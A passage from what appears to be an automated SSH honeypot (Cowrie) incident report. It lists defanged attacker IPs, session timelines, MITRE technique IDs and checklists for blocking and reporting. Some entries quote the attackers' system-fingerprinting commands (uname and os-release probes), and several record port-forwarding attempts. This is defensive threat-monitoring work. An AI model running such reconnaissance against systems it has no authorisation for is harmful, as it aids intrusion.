| **First Seen** | 2026-08-05 13:43 |
| **Last Seen** | 2026-08-05 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:43:58` | `cowrie.session.connect` |
| `2026-08-05 13:43:58` | `cowrie.client.version` |
| `2026-08-05 13:43:58` | `cowrie.client.kex` |
| `2026-08-05 13:43:59` | `cowrie.login.success` |
| `2026-08-05 13:43:59` | `cowrie.session.params` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.success` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:43:59` | `cowrie.command.input` |
| `2026-08-05 13:44:00` | `cowrie.log.closed` |
| `2026-08-05 13:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c5d179f89c

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:44 |
| **Last Seen** | 2026-08-05 13:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:44:03` | `cowrie.session.connect` |
| `2026-08-05 13:44:03` | `cowrie.client.version` |
| `2026-08-05 13:44:04` | `cowrie.client.kex` |
| `2026-08-05 13:44:04` | `cowrie.login.success` |
| `2026-08-05 13:44:05` | `cowrie.session.params` |
| `2026-08-05 13:44:05` | `cowrie.command.input` |
| `2026-08-05 13:44:06` | `cowrie.log.closed` |
| `2026-08-05 13:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bddfa3c1472d

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-08-05 13:44 |
| **Last Seen** | 2026-08-05 13:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:44:35` | `cowrie.session.connect` |
| `2026-08-05 13:44:35` | `cowrie.client.version` |
| `2026-08-05 13:44:35` | `cowrie.client.kex` |
| `2026-08-05 13:44:37` | `cowrie.login.success` |
| `2026-08-05 13:44:38` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23caff6cf32f

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-08-05 13:44 |
| **Last Seen** | 2026-08-05 13:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:44:44` | `cowrie.session.connect` |
| `2026-08-05 13:44:46` | `cowrie.client.version` |
| `2026-08-05 13:44:46` | `cowrie.client.kex` |
| `2026-08-05 13:44:49` | `cowrie.login.success` |
| `2026-08-05 13:44:50` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d9dc8e52bf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:45 |
| **Last Seen** | 2026-08-05 13:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:45:22` | `cowrie.session.connect` |
| `2026-08-05 13:45:22` | `cowrie.client.version` |
| `2026-08-05 13:45:22` | `cowrie.client.kex` |
| `2026-08-05 13:45:23` | `cowrie.login.success` |
| `2026-08-05 13:45:24` | `cowrie.session.params` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.success` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:24` | `cowrie.command.input` |
| `2026-08-05 13:45:25` | `cowrie.log.closed` |
| `2026-08-05 13:45:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d246a3802d9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-05 13:45 |
| **Last Seen** | 2026-08-05 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:45:50` | `cowrie.session.connect` |
| `2026-08-05 13:45:50` | `cowrie.client.version` |
| `2026-08-05 13:45:50` | `cowrie.client.kex` |
| `2026-08-05 13:45:51` | `cowrie.login.success` |
| `2026-08-05 13:45:51` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:45:51` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-456f1866aec8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-05 13:46 |
| **Last Seen** | 2026-08-05 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:46:44` | `cowrie.session.connect` |
| `2026-08-05 13:46:44` | `cowrie.client.version` |
| `2026-08-05 13:46:45` | `cowrie.client.kex` |
| `2026-08-05 13:46:45` | `cowrie.login.success` |
| `2026-08-05 13:46:45` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:46:45` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1043c5f66d43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:46 |
| **Last Seen** | 2026-08-05 13:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:46:49` | `cowrie.session.connect` |
| `2026-08-05 13:46:49` | `cowrie.client.version` |
| `2026-08-05 13:46:49` | `cowrie.client.kex` |
| `2026-08-05 13:46:50` | `cowrie.login.success` |
| `2026-08-05 13:46:51` | `cowrie.session.params` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.success` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.command.input` |
| `2026-08-05 13:46:51` | `cowrie.log.closed` |
| `2026-08-05 13:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e5dc9cc587

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:46 |
| **Last Seen** | 2026-08-05 13:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:46:51` | `cowrie.session.connect` |
| `2026-08-05 13:46:51` | `cowrie.client.version` |
| `2026-08-05 13:46:52` | `cowrie.client.kex` |
| `2026-08-05 13:46:52` | `cowrie.login.success` |
| `2026-08-05 13:46:54` | `cowrie.session.params` |
| `2026-08-05 13:46:54` | `cowrie.command.input` |
| `2026-08-05 13:46:54` | `cowrie.log.closed` |
| `2026-08-05 13:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351b827d212c

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]67` |
| **First Seen** | 2026-08-05 13:46 |
| **Last Seen** | 2026-08-05 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:46:56` | `cowrie.session.connect` |
| `2026-08-05 13:46:56` | `cowrie.client.version` |
| `2026-08-05 13:46:56` | `cowrie.client.kex` |
| `2026-08-05 13:46:57` | `cowrie.login.success` |
| `2026-08-05 13:46:57` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:46:57` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]67` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41287b5489f1

| Field | Detail |
|---|---|
| **Source IP** | `64.89.162[.]146` |
| **First Seen** | 2026-08-05 13:48 |
| **Last Seen** | 2026-08-05 13:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:48:02` | `cowrie.session.connect` |
| `2026-08-05 13:48:02` | `cowrie.client.version` |
| `2026-08-05 13:48:02` | `cowrie.client.kex` |
| `2026-08-05 13:48:03` | `cowrie.login.success` |
| `2026-08-05 13:48:03` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:48:03` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `64.89.162[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b656df88e8c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:48 |
| **Last Seen** | 2026-08-05 13:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:48:19` | `cowrie.session.connect` |
| `2026-08-05 13:48:19` | `cowrie.client.version` |
| `2026-08-05 13:48:19` | `cowrie.client.kex` |
| `2026-08-05 13:48:20` | `cowrie.login.success` |
| `2026-08-05 13:48:21` | `cowrie.session.params` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.success` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:21` | `cowrie.command.input` |
| `2026-08-05 13:48:22` | `cowrie.log.closed` |
| `2026-08-05 13:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55532d0c725

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-05 13:48 |
| **Last Seen** | 2026-08-05 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:48:21` | `cowrie.session.connect` |
| `2026-08-05 13:48:21` | `cowrie.client.version` |
| `2026-08-05 13:48:21` | `cowrie.client.kex` |
| `2026-08-05 13:48:22` | `cowrie.login.success` |
| `2026-08-05 13:48:22` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:48:22` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14528bf59474

| Field | Detail |
|---|---|
| **Source IP** | `13.140.178[.]221` |
| **First Seen** | 2026-08-05 13:49 |
| **Last Seen** | 2026-08-05 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:49:18` | `cowrie.session.connect` |
| `2026-08-05 13:49:18` | `cowrie.client.version` |
| `2026-08-05 13:49:18` | `cowrie.client.kex` |
| `2026-08-05 13:49:19` | `cowrie.login.success` |
| `2026-08-05 13:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.140.178[.]221` to AbuseIPDB if not already reported
- [ ] Block `13.140.178[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faaf542cfb2a

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-05 13:49 |
| **Last Seen** | 2026-08-05 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:49:19` | `cowrie.session.connect` |
| `2026-08-05 13:49:19` | `cowrie.client.version` |
| `2026-08-05 13:49:19` | `cowrie.client.kex` |
| `2026-08-05 13:49:19` | `cowrie.login.success` |
| `2026-08-05 13:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ece1749214

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:49 |
| **Last Seen** | 2026-08-05 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:49:37` | `cowrie.session.connect` |
| `2026-08-05 13:49:37` | `cowrie.client.version` |
| `2026-08-05 13:49:37` | `cowrie.client.kex` |
| `2026-08-05 13:49:38` | `cowrie.login.success` |
| `2026-08-05 13:49:39` | `cowrie.session.params` |
| `2026-08-05 13:49:39` | `cowrie.command.input` |
| `2026-08-05 13:49:39` | `cowrie.log.closed` |
| `2026-08-05 13:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d138780d698

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:49 |
| **Last Seen** | 2026-08-05 13:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:49:48` | `cowrie.session.connect` |
| `2026-08-05 13:49:48` | `cowrie.client.version` |
| `2026-08-05 13:49:48` | `cowrie.client.kex` |
| `2026-08-05 13:49:50` | `cowrie.login.success` |
| `2026-08-05 13:49:51` | `cowrie.session.params` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.success` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.command.input` |
| `2026-08-05 13:49:51` | `cowrie.log.closed` |
| `2026-08-05 13:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a3602f706db

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:51 |
| **Last Seen** | 2026-08-05 13:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:51:19` | `cowrie.session.connect` |
| `2026-08-05 13:51:19` | `cowrie.client.version` |
| `2026-08-05 13:51:19` | `cowrie.client.kex` |
| `2026-08-05 13:51:21` | `cowrie.login.success` |
| `2026-08-05 13:51:23` | `cowrie.session.params` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.success` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.command.input` |
| `2026-08-05 13:51:23` | `cowrie.log.closed` |
| `2026-08-05 13:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff187c71bfaa

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:52 |
| **Last Seen** | 2026-08-05 13:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:52:18` | `cowrie.session.connect` |
| `2026-08-05 13:52:18` | `cowrie.client.version` |
| `2026-08-05 13:52:18` | `cowrie.client.kex` |
| `2026-08-05 13:52:19` | `cowrie.login.success` |
| `2026-08-05 13:52:20` | `cowrie.session.params` |
| `2026-08-05 13:52:20` | `cowrie.command.input` |
| `2026-08-05 13:52:20` | `cowrie.log.closed` |
| `2026-08-05 13:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e6e95e4e1d

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
